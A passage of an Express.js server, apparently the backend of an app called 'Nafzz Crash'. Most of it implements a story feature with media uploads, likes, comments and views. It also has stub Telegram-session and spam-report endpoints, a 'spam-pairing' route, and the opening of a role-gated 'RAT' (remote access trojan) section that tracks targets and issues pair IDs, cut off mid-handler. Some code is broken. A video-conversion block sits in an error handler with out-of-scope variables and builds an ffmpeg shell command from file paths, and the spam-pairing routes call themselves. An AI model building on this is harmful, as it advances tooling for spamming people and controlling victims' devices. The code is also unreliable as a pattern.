app.get('/api/tools/telegram/sessions', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const userSess = Object.keys(telegramSessions)
    .filter(s => s.startsWith(keyInfo.username + '_'))
    .map(s => ({ session: s, phone: telegramSessions[s]?.phone || '' }));
  return res.json({ valid: true, sessions: userSess });
});

app.get('/api/tools/telegram/login', (req, res) => {
  const { key, phone } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const loginId = keyInfo.username + '_' + phone + '_' + Date.now();
  telegramSessions[loginId] = { phone, status: 'pending', username: keyInfo.username };
  return res.json({ valid: true, loginId, message: 'Login initiated' });
});

app.get('/api/tools/telegram/auth', (req, res) => {
  const { key, loginId, input } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  if (telegramSessions[loginId]) telegramSessions[loginId].status = 'authenticated';
  return res.json({ valid: true, message: 'Auth submitted' });
});

app.get('/api/tools/telegram/status', (req, res) => {
  const { key, loginId } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const sess = telegramSessions[loginId];
  return res.json({ valid: true, status: sess?.status || 'unknown' });
});

app.post('/api/tools/telegram/verify-session-password', (req, res) => {
  return res.json({ valid: true, message: 'Password verification not implemented' });
});

app.get('/api/tools/telegram/refresh-sessions', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  return res.json({ valid: true, message: 'Sessions refreshed' });
});

app.get('/api/tools/telegram/remove-ses', (req, res) => {
  const { key, phone } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const toDelete = Object.keys(telegramSessions).find(s => telegramSessions[s]?.phone === phone && telegramSessions[s]?.username === keyInfo.username);
  if (toDelete) delete telegramSessions[toDelete];
  return res.json({ valid: true });
});

app.post('/api/tools/telegram/spam-report', (req, res) => {
  return res.json({ valid: true, message: 'Spam report submitted' });
});

app.get('/api/tools/telegram/report-status', (req, res) => {
  const { key, reportId } = req.query;
  return res.json({ valid: true, status: 'processing', reportId });
});

app.get('/api/spam-pairing', (req, res) => {
  req.url = '/api/spam-pairing';
  app.handle(req, res);
});
app.post('/api/spam-pairing', (req, res) => {
  req.url = '/api/spam-pairing';
  app.handle(req, res);
});

app.get('/api/chat/public', (req, res) => { req.url = '/publicChat?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/chat/public', (req, res) => { req.url = '/publicChat'; app.handle(req, res); });
app.delete('/api/chat/public', (req, res) => { req.url = '/publicChat?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.delete('/api/chat/public/all', (req, res) => { req.url = '/publicChat/all?' + (req.url.split('?')[1]||''); app.handle(req, res); });

// ═══════════════════════════════════════════════════════════════════════════
// ======================== STORY ENDPOINTS ==================================
// ======================= UNTUK NAFZZ CRASH STORY PAGE ============================
// ===================== VERSI UPDATE LENGKAP & SINKRON ======================
// ═══════════════════════════════════════════════════════════════════════════

// ─── KONFIGURASI FOLDER STORY ──────────────────────────────────────
const STORY_UPLOAD_DIR = path.join(__dirname, 'story_uploads');
const STORY_DATA_FILE = path.join(__dirname, 'story_data.json');

// ─── LIMIT & KONFIGURASI ──────────────────────────────────────────
const STORY_MAX_AGE_MS = 24 * 60 * 60 * 1000;     // 24 jam
const STORY_MAX_FILE_SIZE = 10 * 1024 * 1024;      // 10 MB
const STORY_MAX_PER_USER = 10;                     // max 10 story per user
const STORY_MAX_CAPTION = 500;                     // max 500 karakter
const STORY_MAX_TEXT = 500;                        // max 500 karakter teks

// ─── BUAT FOLDER OTOMATIS ──────────────────────────────────────────
if (!fs.existsSync(STORY_UPLOAD_DIR)) {
    fs.mkdirSync(STORY_UPLOAD_DIR, { recursive: true });
    console.log('[📁 STORY] Folder story_uploads dibuat.');
}

if (!fs.existsSync(STORY_DATA_FILE)) {
    fs.writeFileSync(STORY_DATA_FILE, JSON.stringify([], null, 2));
    console.log('[📁 STORY] File story_data.json dibuat.');
}

// ─── FUNGSI BACA/TULIS STORY ──────────────────────────────────────
function loadStories() {
    try {
        if (!fs.existsSync(STORY_DATA_FILE)) return [];
        const data = JSON.parse(fs.readFileSync(STORY_DATA_FILE, 'utf8'));
        return Array.isArray(data) ? data : [];
    } catch (e) {
        console.error('[STORY] Load error:', e.message);
        return [];
    }
}

function saveStories(stories) {
    try {
        fs.writeFileSync(STORY_DATA_FILE, JSON.stringify(stories, null, 2));
        return true;
    } catch (e) {
        console.error('[STORY] Save error:', e.message);
        return false;
    }
}

// ─── CLEANUP STORY EXPIRED (24 JAM) ────────────────────────────────
function cleanupExpiredStories() {
    const now = Date.now();
    const stories = loadStories();
    const alive = [];
    
    for (const story of stories) {
        const created = Date.parse(story.createdAt || '');
        if (!created || (now - created) >= STORY_MAX_AGE_MS) {
            // Hapus file fisik
            if (story.fileName) {
                const filePath = path.join(STORY_UPLOAD_DIR, story.fileName);
                try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (_) {}
            }
            continue;
        }
        alive.push(story);
    }
    
    if (alive.length !== stories.length) {
        saveStories(alive);
        console.log(`[🧹 STORY] Cleanup: ${stories.length - alive.length} story expired dihapus.`);
    }
    return alive;
}

// ─── CLEANUP OTOMATIS SETIAP 5 MENIT ───────────────────────────────
setInterval(cleanupExpiredStories, 5 * 60 * 1000);

// ─── HELPER: LIMIT STORY PER USER ──────────────────────────────────
function enforceUserStoryLimit(username) {
    const stories = cleanupExpiredStories();
    const mine = stories.filter(s => s.username === username);
    
    if (mine.length >= STORY_MAX_PER_USER) {
        // Urutkan dari lama ke baru, hapus yang paling lama
        const sorted = mine.sort((a, b) => 
            Date.parse(a.createdAt) - Date.parse(b.createdAt)
        );
        
        const toDelete = sorted.slice(0, mine.length - STORY_MAX_PER_USER + 1);
        const deleteIds = toDelete.map(s => s.id);
        
        // Hapus file fisik
        for (const story of toDelete) {
            if (story.fileName) {
                const filePath = path.join(STORY_UPLOAD_DIR, story.fileName);
                try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (_) {}
            }
        }
        
        const filtered = stories.filter(s => !deleteIds.includes(s.id));
        saveStories(filtered);
        console.log(`[🧹 STORY] Auto-hapus ${deleteIds.length} story lama user: ${username}`);
    }
}

// ─── MULTER STORAGE UNTUK UPLOAD STORY ────────────────────────────
const storyUploadStorage = multer.diskStorage({
    destination: (_req, _file, cb) => cb(null, STORY_UPLOAD_DIR),
    filename: (_req, file, cb) => {
        const ext = path.extname(file.originalname || '').toLowerCase();
        const safeExt = /^[.][a-z0-9]{1,8}$/.test(ext) ? ext : '';
        cb(null, `story_${Date.now()}_${crypto.randomBytes(8).toString('hex')}${safeExt}`);
    }
});

// ─── MULTER UNTUK STORY — VERSI RELAKSASI ─────────────────────────
const storyUploadMulter = multer({
    storage: storyUploadStorage,
    limits: { 
        fileSize: STORY_MAX_FILE_SIZE,  // ✅ 10 MB
        files: 1,
    },
    fileFilter: (_req, file, cb) => {
        // ─── LEBIH FLEKSIBEL: BY MIMETYPE + EXTENSION ──────────────
        const mimetype = (file.mimetype || '').toLowerCase();
        const filename = (file.originalname || '').toLowerCase();
        
        // Cek by mimetype
        const isImageMime = mimetype.startsWith('image/');
        const isVideoMime = mimetype.startsWith('video/');
        
        // Cek by extension (fallback)
        const imageExt = /\.(jpg|jpeg|png|gif|webp|bmp|heic|heif|tiff|tif|svg|ico)$/i.test(filename);
        const videoExt = /\.(mp4|mov|avi|mkv|webm|3gp|flv|wmv|m4v|mpeg|mpg|ogv)$/i.test(filename);
        
        // ✅ IZINKAN application/octet-stream (fallback Flutter)
        const isGeneric = mimetype === 'application/octet-stream';
        
        // Gabungkan
        const ok = isImageMime || isVideoMime || imageExt || videoExt || isGeneric;
        
        if (ok) {
            console.log(`[📤 STORY UPLOAD] Accept: ${filename} (${mimetype})`);
            cb(null, true);
        } else {
            console.log(`[❌ STORY UPLOAD] Reject: ${filename} (${mimetype})`);
            cb(new Error(`Hanya foto/video yang diperbolehkan (diterima: ${mimetype})`), false);
        }
    }
});

// ─── SERVE FILE STATIC ─────────────────────────────────────────────
app.use('/story_uploads', express.static(STORY_UPLOAD_DIR, { maxAge: '1h' }));

// ═══════════════════════════════════════════════════════════════════════════
// HELPER: FORMAT STORY UNTUK RESPONSE
// ═══════════════════════════════════════════════════════════════════════════
function formatStoryForResponse(story, host) {
    const mediaUrl = story.fileName 
        ? `${host}/story_uploads/${encodeURIComponent(story.fileName)}`
        : null;
    
    return {
        id: story.id,
        username: story.username,
        role: story.role || 'member',
        content: story.content || mediaUrl || '',
        type: story.type || 'text',
        caption: story.caption || '',
        isVideo: story.type === 'video',
        createdAt: story.createdAt,
        mediaUrl: mediaUrl,
        url: mediaUrl,
        fileName: story.fileName || null
    };
}

// ═══════════════════════════════════════════════════════════════════════════
// GET /api/stories — AMBIL SEMUA STORY
// ═══════════════════════════════════════════════════════════════════════════
app.get('/api/stories', (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.status(401).json({ valid: false, message: 'Invalid session key' });
    }
    
    try {
        const stories = cleanupExpiredStories();
        const host = `${req.protocol}://${req.get('host')}`;
        
        const formattedStories = stories.map(story => formatStoryForResponse(story, host));
        
        res.json({
            valid: true,
            stories: formattedStories,
            total: formattedStories.length
        });
    } catch (e) {
        console.error('[STORY GET]', e);
        res.status(500).json({ valid: false, message: 'Gagal mengambil story' });
    }
});

// ═══════════════════════════════════════════════════════════════════════════
// GET /api/stories/my — AMBIL STORY MILIK SENDIRI
// ═══════════════════════════════════════════════════════════════════════════
app.get('/api/stories/my', (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.status(401).json({ valid: false, message: 'Invalid session key' });
    }
    
    try {
        const stories = cleanupExpiredStories();
        const host = `${req.protocol}://${req.get('host')}`;
        
        const myStories = stories
            .filter(s => s.username === keyInfo.username)
            .map(story => formatStoryForResponse(story, host));
        
        res.json({
            valid: true,
            stories: myStories,
            total: myStories.length
        });
    } catch (e) {
        console.error('[STORY MY]', e);
        res.status(500).json({ valid: false, message: 'Gagal mengambil story' });
    }
});

// ═══════════════════════════════════════════════════════════════════════════
// GET /api/stories/others — AMBIL STORY ORANG LAIN
// ═══════════════════════════════════════════════════════════════════════════
app.get('/api/stories/others', (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.status(401).json({ valid: false, message: 'Invalid session key' });
    }
    
    try {
        const stories = cleanupExpiredStories();
        const host = `${req.protocol}://${req.get('host')}`;
        
        const otherStories = stories
            .filter(s => s.username !== keyInfo.username)
            .map(story => formatStoryForResponse(story, host));
        
        res.json({
            valid: true,
            stories: otherStories,
            total: otherStories.length
        });
    } catch (e) {
        console.error('[STORY OTHERS]', e);
        res.status(500).json({ valid: false, message: 'Gagal mengambil story' });
    }
});

// ═══════════════════════════════════════════════════════════════════════════
// GET /api/stories/check — CEK LIMIT STORY USER
// ═══════════════════════════════════════════════════════════════════════════
app.get('/api/stories/check', (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.status(401).json({ valid: false, message: 'Invalid session key' });
    }
    
    try {
        const stories = cleanupExpiredStories();
        const mine = stories.filter(s => s.username === keyInfo.username);
        
        res.json({
            valid: true,
            total: mine.length,
            max: STORY_MAX_PER_USER,
            remaining: Math.max(0, STORY_MAX_PER_USER - mine.length),
            canUpload: mine.length < STORY_MAX_PER_USER
        });
    } catch (e) {
        console.error('[STORY CHECK]', e);
        res.status(500).json({ valid: false, message: 'Gagal cek limit' });
    }
});

// ═══════════════════════════════════════════════════════════════════════════
// POST /api/stories/text — BUAT STORY TEKS
// ═══════════════════════════════════════════════════════════════════════════
app.post('/api/stories/text', (req, res) => {
    const { key } = req.query;
    const { content } = req.body;
    
    console.log('[STORY TEXT] Request by key:', key);
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.status(401).json({ valid: false, message: 'Invalid session key' });
    }
    
    if (!content || content.trim().length === 0) {
        return res.status(400).json({ valid: false, message: 'Content tidak boleh kosong' });
    }
    
    try {
        const db = loadDatabase();
        const user = db.find(u => u.username === keyInfo.username);
        if (!user) {
            return res.status(401).json({ valid: false, message: 'User not found' });
        }
        
        // ─── ENFORCE LIMIT ────────────────────────────────────────
        enforceUserStoryLimit(keyInfo.username);
        
        // ─── BUAT STORY BARU ────────────────────────────────────────
        const newStory = {
            id: crypto.randomUUID(),
            username: keyInfo.username,
            role: user.role || 'member',
            type: 'text',
            content: content.trim().slice(0, STORY_MAX_TEXT),
            caption: '',
            fileName: null,
            createdAt: new Date().toISOString()
        };
        
        const allStories = loadStories();
        saveStories([newStory, ...allStories]);
        
        const host = `${req.protocol}://${req.get('host')}`;
        const formatted = formatStoryForResponse(newStory, host);
        
        console.log('[✅ STORY TEXT] Berhasil dibuat oleh:', keyInfo.username);
        
        res.json({
            valid: true,
            story: {
                ...formatted,
                _isMine: true
            },
            message: 'Story teks berhasil dibuat!'
        });
        
    } catch (e) {
        console.error('[STORY TEXT ERROR]', e);
        res.status(500).json({ valid: false, message: 'Gagal membuat story: ' + e.message });
    }
});

// ═══════════════════════════════════════════════════════════════════════════
// POST /api/stories/media — UPLOAD FOTO/VIDEO STORY
// ═══════════════════════════════════════════════════════════════════════════
app.post('/api/stories/media', (req, res) => {
    storyUploadMulter.single('media')(req, res, async (error) => {
        // ─── HANDLE MULTER ERROR ────────────────────────────────────
        if (error) {
            console.error('[STORY MEDIA] Multer error:', error.message);
            
            let errorMsg = 'Upload gagal';
            
            if (error.code === 'LIMIT_FILE_SIZE') {
                errorMsg = `File terlalu besar! Maksimal ${STORY_MAX_FILE_SIZE / (1024 * 1024)} MB`;
            } else if (error.code === 'LIMIT_FILE_COUNT') {
                errorMsg = 'Hanya boleh 1 file per upload';
            } else {
                errorMsg = error.message || 'Upload gagal';
            }
            
            return res.status(400).json({ 
                valid: false, 
                message: errorMsg
            });
        }
        
        const { key } = req.query;
        const { type } = req.body;
        
        console.log('═══════════════════════════════════════');
        console.log('[STORY MEDIA] 🚀 REQUEST MASUK');
        console.log('[STORY MEDIA] Key:', key);
        console.log('[STORY MEDIA] Type:', type);
        console.log('[STORY MEDIA] File:', req.file?.filename);
        console.log('[STORY MEDIA] Size:', req.file?.size, 'bytes');
        console.log('═══════════════════════════════════════');
        
        try {
            // ─── VALIDASI SESSION ────────────────────────────────────
            const keyInfo = activeKeys[key];
            if (!keyInfo) {
                console.error('[STORY MEDIA] ❌ Invalid session key');
                if (req.file?.path) { try { fs.unlinkSync(req.file.path); } catch (_) {} }
                return res.status(401).json({ valid: false, message: 'Invalid session key' });
            }
            console.log('[STORY MEDIA] ✅ Session valid:', keyInfo.username);
            
            // ─── VALIDASI FILE ────────────────────────────────────────
            if (!req.file) {
                console.error('[STORY MEDIA] ❌ No file uploaded');
                return res.status(400).json({ valid: false, message: 'File media wajib diisi' });
            }
            
            // ─── VALIDASI USER ────────────────────────────────────────
            const db = loadDatabase();
            const user = db.find(u => u.username === keyInfo.username);
            if (!user) {
                console.error('[STORY MEDIA] ❌ User not found');
                if (req.file?.path) { try { fs.unlinkSync(req.file.path); } catch (_) {} }
                return res.status(401).json({ valid: false, message: 'User not found' });
            }
            console.log('[STORY MEDIA] ✅ User found:', user.username);
            
            // ─── ENFORCE LIMIT ────────────────────────────────────────
            console.log('[STORY MEDIA] 🔄 Enforcing limit...');
            enforceUserStoryLimit(keyInfo.username);
            console.log('[STORY MEDIA] ✅ Limit OK');
            
            // ─── TENTUKAN TIPE MEDIA ──────────────────────────────────
            const fileMime = (req.file.mimetype || '').toLowerCase();
            const fileExt = path.extname(req.file.filename || '').toLowerCase();
            
            const videoExts = ['.mp4', '.mov', '.avi', '.mkv', '.webm', '.3gp', '.flv', '.wmv', '.m4v', '.mpeg', '.mpg', '.ogv'];
            const isVideo = type === 'video' || 
                           fileMime.startsWith('video/') ||
                           videoExts.includes(fileExt);
            
            console.log('[STORY MEDIA] Type detect:', isVideo ? 'VIDEO' : 'IMAGE');
            
            // ─── BUAT STORY BARU ────────────────────────────────────────
            const newStory = {
                id: crypto.randomUUID(),
                username: keyInfo.username,
                role: user.role || 'member',
                type: isVideo ? 'video' : 'image',
                content: '',
                caption: '',
                fileName: path.basename(req.file.filename),
                fileSize: req.file.size,
                mimeType: req.file.mimetype,
                createdAt: new Date().toISOString()
            };
            
            console.log('[STORY MEDIA] 💾 Saving to story_data.json...');
            const allStories = loadStories();
            saveStories([newStory, ...allStories]);
            console.log('[STORY MEDIA] ✅ Saved! Total stories:', allStories.length + 1);
            
            const host = `${req.protocol}://${req.get('host')}`;
            const formatted = formatStoryForResponse(newStory, host);
            
            console.log(`[✅ STORY MEDIA] Berhasil: ${newStory.fileName} | Size: ${(req.file.size / 1024).toFixed(2)} KB`);
            console.log('[STORY MEDIA] 📤 Sending response...');
            
            res.json({
                valid: true,
                story: {
                    ...formatted,
                    content: formatted.mediaUrl,
                    _isMine: true
                },
                message: `${isVideo ? 'Video' : 'Foto'} story berhasil diupload!`
            });
            
            console.log('[STORY MEDIA] ✅ Response terkirim!');
            
        } catch (e) {
            if (req.file?.path) { try { fs.unlinkSync(req.file.path); } catch (_) {} }
            console.error('[❌ STORY MEDIA ERROR]', e.message);
            console.error('[❌ STORY MEDIA STACK]', e.stack);
            res.status(500).json({ valid: false, message: 'Gagal upload: ' + e.message });
            
// ✅ AUTO-CONVERT VIDEO KE H.264 BASELINE
if (isVideo) {
  const { exec } = require('child_process');
  const videoPath = path.join(STORY_UPLOAD_DIR, newStory.fileName);
  const compressedPath = path.join(STORY_UPLOAD_DIR, `comp_${newStory.fileName}`);
  
  console.log('[🎬 CONVERT] Compressing video:', newStory.fileName);
  
  exec(`ffmpeg -i "${videoPath}" -c:v libx264 -profile:v baseline -level 3.0 -preset fast -crf 28 -vf "scale=720:-2" -c:a aac -b:a 96k -movflags +faststart "${compressedPath}" -y`, 
    (err) => {
      if (!err && fs.existsSync(compressedPath)) {
        fs.unlinkSync(videoPath);
        fs.renameSync(compressedPath, videoPath);
        console.log('[✅ CONVERT] Berhasil:', newStory.fileName);
      } else {
        console.error('[❌ CONVERT] Gagal:', err?.message);
      }
    });
}
       }
    });
});

// ═══════════════════════════════════════════════════════════════════════════
// STORY SOCIAL — LIKE, COMMENT, VIEW
// ═══════════════════════════════════════════════════════════════════════════

const STORY_SOCIAL_FILE = path.join(__dirname, 'story_social.json');

// ─── LOAD & SAVE SOCIAL DATA ─────────────────────────────────────────────
function loadStorySocial() {
  try {
    if (!fs.existsSync(STORY_SOCIAL_FILE)) {
      fs.writeFileSync(STORY_SOCIAL_FILE, JSON.stringify({}));
      return {};
    }
    return JSON.parse(fs.readFileSync(STORY_SOCIAL_FILE, 'utf8'));
  } catch (e) {
    console.error('[SOCIAL] Load error:', e.message);
    return {};
  }
}

function saveStorySocial(data) {
  try {
    fs.writeFileSync(STORY_SOCIAL_FILE, JSON.stringify(data, null, 2));
    return true;
  } catch (e) {
    console.error('[SOCIAL] Save error:', e.message);
    return false;
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// 1. POST /api/stories/:id/like — LIKE / UNLIKE STORY
// ═══════════════════════════════════════════════════════════════════════════
app.post('/api/stories/:id/like', (req, res) => {
  const { key } = req.query;
  const { id } = req.params;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  
  try {
    const social = loadStorySocial();
    
    if (!social[id]) {
      social[id] = { likes: [], comments: [], views: [] };
    }
    
    const username = keyInfo.username;
    const likeIndex = social[id].likes.indexOf(username);
    let liked = false;
    
    if (likeIndex === -1) {
      // ─── BELUM LIKE → TAMBAH LIKE ─────────────────────
      social[id].likes.push(username);
      liked = true;
      console.log(`[❤️ LIKE] ${username} → story ${id}`);
    } else {
      // ─── UDAH LIKE → UNLIKE ───────────────────────────
      social[id].likes.splice(likeIndex, 1);
      liked = false;
      console.log(`[💔 UNLIKE] ${username} → story ${id}`);
    }
    
    saveStorySocial(social);
    
    res.json({
      valid: true,
      liked: liked,
      likesCount: social[id].likes.length,
      likes: social[id].likes,
    });
  } catch (e) {
    console.error('[LIKE ERROR]', e);
    res.status(500).json({ valid: false, message: 'Gagal like story' });
  }
});

// ═══════════════════════════════════════════════════════════════════════════
// 2. POST /api/stories/:id/comment — TAMBAH KOMENTAR
// ═══════════════════════════════════════════════════════════════════════════
app.post('/api/stories/:id/comment', (req, res) => {
  const { key } = req.query;
  const { id } = req.params;
  const { message } = req.body;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  
  if (!message || message.trim().length === 0) {
    return res.status(400).json({ valid: false, message: 'Komentar kosong' });
  }
  
  if (message.length > 300) {
    return res.status(400).json({ valid: false, message: 'Komentar maksimal 300 karakter' });
  }
  
  try {
    const social = loadStorySocial();
    
    if (!social[id]) {
      social[id] = { likes: [], comments: [], views: [] };
    }
    
    const comment = {
      id: 'cmt_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
      username: keyInfo.username,
      message: message.trim(),
      timestamp: new Date().toISOString(),
    };
    
    social[id].comments.push(comment);
    saveStorySocial(social);
    
    console.log(`[💬 COMMENT] ${keyInfo.username} → story ${id}: ${message}`);
    
    res.json({
      valid: true,
      comment: comment,
      commentsCount: social[id].comments.length,
      comments: social[id].comments,
    });
  } catch (e) {
    console.error('[COMMENT ERROR]', e);
    res.status(500).json({ valid: false, message: 'Gagal kirim komentar' });
  }
});

// ═══════════════════════════════════════════════════════════════════════════
// 3. GET /api/stories/:id/comments — AMBIL SEMUA KOMENTAR
// ═══════════════════════════════════════════════════════════════════════════
app.get('/api/stories/:id/comments', (req, res) => {
  const { key } = req.query;
  const { id } = req.params;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  
  try {
    const social = loadStorySocial();
    const comments = social[id]?.comments || [];
    
    res.json({
      valid: true,
      comments: comments,
      commentsCount: comments.length,
    });
  } catch (e) {
    console.error('[GET COMMENTS ERROR]', e);
    res.status(500).json({ valid: false, message: 'Gagal ambil komentar' });
  }
});

// ═══════════════════════════════════════════════════════════════════════════
// 4. POST /api/stories/:id/view — TAMBAH VIEW
// ═══════════════════════════════════════════════════════════════════════════
app.post('/api/stories/:id/view', (req, res) => {
  const { key } = req.query;
  const { id } = req.params;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  
  try {
    const social = loadStorySocial();
    
    if (!social[id]) {
      social[id] = { likes: [], comments: [], views: [] };
    }
    
    const username = keyInfo.username;
    
    // ─── KALAU USER YANG SAMA UDAH VIEW, GA USAH TAMBAH LAGI ───
    if (!social[id].views.includes(username)) {
      social[id].views.push(username);
      saveStorySocial(social);
      console.log(`[👁️ VIEW] ${username} → story ${id}`);
    }
    
    res.json({
      valid: true,
      viewsCount: social[id].views.length,
      views: social[id].views,
    });
  } catch (e) {
    console.error('[VIEW ERROR]', e);
    res.status(500).json({ valid: false, message: 'Gagal tambah view' });
  }
});

// ═══════════════════════════════════════════════════════════════════════════
// 5. GET /api/stories/:id/social — AMBIL SEMUA DATA (likes + comments + views)
// ═══════════════════════════════════════════════════════════════════════════
app.get('/api/stories/:id/social', (req, res) => {
  const { key } = req.query;
  const { id } = req.params;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  
  try {
    const social = loadStorySocial();
    const data = social[id] || { likes: [], comments: [], views: [] };
    const username = keyInfo.username;
    
    res.json({
      valid: true,
      likes: data.likes,
      likesCount: data.likes.length,
      isLiked: data.likes.includes(username),
      comments: data.comments,
      commentsCount: data.comments.length,
      views: data.views,
      viewsCount: data.views.length,
    });
  } catch (e) {
    console.error('[SOCIAL ERROR]', e);
    res.status(500).json({ valid: false, message: 'Gagal ambil social data' });
  }
});

// ═══════════════════════════════════════════════════════════════════════════
// DELETE /api/stories/:id — HAPUS STORY
// ═══════════════════════════════════════════════════════════════════════════
app.delete('/api/stories/:id', (req, res) => {
    const { key } = req.query;
    const { id } = req.params;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.status(401).json({ valid: false, message: 'Invalid session key' });
    }
    
    try {
        const stories = cleanupExpiredStories();
        const story = stories.find(s => s.id === id);
        
        if (!story) {
            return res.status(404).json({ valid: false, message: 'Story tidak ditemukan' });
        }
        
        if (story.username !== keyInfo.username) {
            return res.status(403).json({ valid: false, message: 'Bukan story kamu' });
        }
        
        // Hapus file fisik
        if (story.fileName) {
            const filePath = path.join(STORY_UPLOAD_DIR, story.fileName);
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (_) {}
        }
        
        const filtered = stories.filter(s => s.id !== id);
        saveStories(filtered);
        
        console.log('[✅ STORY DELETE]', id, 'dihapus oleh:', keyInfo.username);
        
        res.json({ valid: true, message: 'Story berhasil dihapus' });
        
    } catch (e) {
        console.error('[STORY DELETE ERROR]', e);
        res.status(500).json({ valid: false, message: 'Gagal hapus story' });
    }
});

// ═══════════════════════════════════════════════════════════════════════════
// ALIAS ENDPOINT (untuk kompatibilitas)
// ═══════════════════════════════════════════════════════════════════════════
app.get('/api/story', (req, res) => { req.url = '/api/stories?' + (req.url.split('?')[1] || ''); app.handle(req, res); });
app.get('/api/story/my', (req, res) => { req.url = '/api/stories/my?' + (req.url.split('?')[1] || ''); app.handle(req, res); });
app.get('/api/story/others', (req, res) => { req.url = '/api/stories/others?' + (req.url.split('?')[1] || ''); app.handle(req, res); });
app.get('/api/story/check', (req, res) => { req.url = '/api/stories/check?' + (req.url.split('?')[1] || ''); app.handle(req, res); });
app.post('/api/story/text', (req, res) => { req.url = '/api/stories/text?' + (req.url.split('?')[1] || ''); app.handle(req, res); });
app.post('/api/story/media', (req, res) => { req.url = '/api/stories/media?' + (req.url.split('?')[1] || ''); app.handle(req, res); });
app.delete('/api/story/:id', (req, res) => { req.url = '/api/stories/' + req.params.id + '?' + (req.url.split('?')[1] || ''); app.handle(req, res); });

console.log('🔥 STORY ENDPOINTS LOADED!');
console.log('📋 /api/stories - GET semua story');
console.log('📋 /api/stories/my - GET story sendiri');
console.log('📋 /api/stories/others - GET story orang lain');
console.log('📋 /api/stories/check - GET cek limit story');
console.log('📋 /api/stories/text - POST story teks');
console.log('📋 /api/stories/media - POST upload foto/video');
console.log('📋 /api/stories/:id - DELETE story');
console.log(`📁 Folder upload: story_uploads/ (max ${STORY_MAX_FILE_SIZE / (1024 * 1024)}MB)`);
console.log(`📁 Data file: story_data.json (max ${STORY_MAX_PER_USER} story/user, expired 24 jam)`);

// ============================================
// RAT ENDPOINTS — GENETIC RAT (NAFZZ CRASH)
// ============================================
// Permission Rules (SESUAI DEVICE_DASHBOARD.DART):
// ✅ Bisa akses: developer, founder, kingz, high owner, owner, tk, admin
// ❌ Tidak bisa akses: member, vip, reseller
// ============================================

const RAT_TARGETS = './rat_targets.json';
const RAT_LIVE = {};

// ─── FUNGSI UTILITY ──────────────────────────────────────────────────────────
function loadDatabase() {
  try {
    if (!fs.existsSync(DB_PATH)) {
      fs.writeFileSync(DB_PATH, JSON.stringify([]));
      return [];
    }
    const content = fs.readFileSync(DB_PATH, 'utf8');
    return content.trim() ? JSON.parse(content) : [];
  } catch (e) {
    console.error("[❌ DB] Error:", e.message);
    return [];
  }
}

function saveDatabase(data) {
  try {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error("[❌ DB] Error saving:", e.message);
  }
}

function genPairId() {
  return crypto.randomBytes(8).toString('hex').toUpperCase();
}

function readRat(file) {
  try {
    if (fs.existsSync(file)) {
      const content = fs.readFileSync(file, 'utf8');
      return content.trim() ? JSON.parse(content) : [];
    }
    return [];
  } catch (e) {
    console.error(`[❌ RAT] Error reading ${file}:`, e.message);
    return [];
  }
}

function saveRat(file, data) {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error(`[❌ RAT] Error saving ${file}:`, e.message);
  }
}

function loadDevicePerms() {
  try {
    if (fs.existsSync(devicePermFile)) {
      const content = fs.readFileSync(devicePermFile, 'utf8');
      return content.trim() ? JSON.parse(content) : {};
    }
  } catch(e) {}
  return {};
}

function saveDevicePerms(data) {
  try {
    fs.writeFileSync(devicePermFile, JSON.stringify(data, null, 2));
  } catch(e) {
    console.error('❌ Failed to save device perms:', e.message);
  }
}

// ─── CEK PERMISSION ──────────────────────────────────────────────────────────
// ✅ Bisa akses RAT: developer, founder, kingz, high owner, owner, tk, admin
// ❌ Tidak bisa akses: member, vip, reseller
const ALLOWED_RAT_ROLES = [
  'developer', 'founder', 'kingz', 'high owner', 'owner', 'tk', 'admin'
];

function canAccessRAT(role) {
  return ALLOWED_RAT_ROLES.includes(role?.toLowerCase() || '');
}

function isFullAccess(role) {
  return canAccessRAT(role);
}

// ─── 1. GET PAIR ID ──────────────────────────────────────────────────────────
// ✅ Bisa: developer, founder, kingz, high owner, owner, tk, admin
// ❌ Tidak bisa: member, vip, reseller
app.get("/rat/pairid", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === keyInfo.username);
  if (idx === -1) return res.json({ valid: false, message: "User not found" });
  
  const user = db[idx];
  
